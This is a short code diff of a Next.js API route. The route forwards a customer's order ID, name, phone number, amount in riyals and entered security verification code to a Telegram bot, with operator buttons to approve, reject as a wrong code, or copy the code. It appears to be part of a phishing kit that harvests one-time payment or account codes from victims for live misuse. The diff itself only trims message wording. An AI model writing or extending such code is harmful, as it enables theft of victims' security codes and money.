@@ -57,15 +57,10 @@ export async function POST(req: NextRequest) {
   const targetBot = getOrderBot(cleanOrderId);
 
   const text = [
-    `🔐 كود تحقق أمان جديد وصل الآن!`,
-    `━━━━━━━━━━━━━━━━━━`,
-    `🆔 رقم الطلب: <code>${cleanOrderId}</code>`,
+    `🔐 كود تحقق جديد`,
+    `🆔 رقم الطلب: ${cleanOrderId}`,
     `👤 اسم العميل: ${customerName || "—"}`,
-    `📱 رقم الهاتف: <code>${phone || "—"}</code>`,
-    `💰 المبلغ: <b>${amount ? `${amount} ر.س` : "—"}</b>`,
-    `📟 الكود المدخل: <b><code>${code}</code></b>`,
-    `━━━━━━━━━━━━━━━━━━`,
-    `👇 حدد الإجراء المطلوب للعميل الآن:`,
+    `📟 الكود: ${code}`,
   ].join("\n");
 
   const sent = await sendTelegramMessage(targetBot, {
@@ -73,11 +68,11 @@ export async function POST(req: NextRequest) {
     reply_markup: {
       inline_keyboard: [
         [
-          { text: "✅ تأكيد الطلب (قبول)", callback_data: `v_app_${cleanOrderId}` },
-          { text: "❌ كود خاطئ (رفض)", callback_data: `v_rej_${cleanOrderId}` },
+          { text: "✅ تأكيد الطلب", callback_data: `v_app_${cleanOrderId}` },
+          { text: "❌ كود خاطئ", callback_data: `v_rej_${cleanOrderId}` },
         ],
         [
-          { text: `📋 نسخ الكود: ${code}`, copy_text: { text: String(code) } },
+          { text: `📋 نسخ الكود`, copy_text: { text: String(code) } },
         ],
       ],
     },
